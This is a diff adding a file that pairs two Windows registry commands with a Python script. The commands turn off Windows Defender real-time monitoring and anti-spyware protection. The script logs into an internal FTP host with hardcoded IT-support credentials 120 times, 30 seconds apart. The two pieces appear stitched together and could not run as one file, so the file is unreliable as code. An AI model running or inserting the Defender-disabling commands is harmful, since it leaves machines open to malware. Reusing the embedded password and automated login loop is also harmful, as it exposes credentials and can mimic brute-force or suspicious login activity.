@@ -1,0 +1,36 @@
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender/Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+
+
+import ftplib
+import time
+
+def auto_login(host, username, password):
+    try:
+        with ftplib.FTP(host) as ftp:
+            ftp.login(username, password)
+            print("Logged in successfully")
+            auto_logout(ftp)
+    except ftplib.all_errors as e:
+        print(f"Error: {e}")
+
+def auto_logout(ftp):
+    try:
+        ftp.quit()
+        print("Logged out successfully")
+    except ftplib.all_errors as e:
+        print(f"Error: {e}")
+
+def main(rounds):
+    host = "10.62.0.182"
+    username = "itsupport01"
+    password = "P@55vv0rd"
+
+    print(f"Performing {rounds} rounds...")
+    for i in range(1, rounds + 1):
+        print(f"Round {i}/{rounds}")
+        auto_login(host, username, password)
+        time.sleep(30)
+
+if __name__ == "__main__":
+    main(rounds=120)
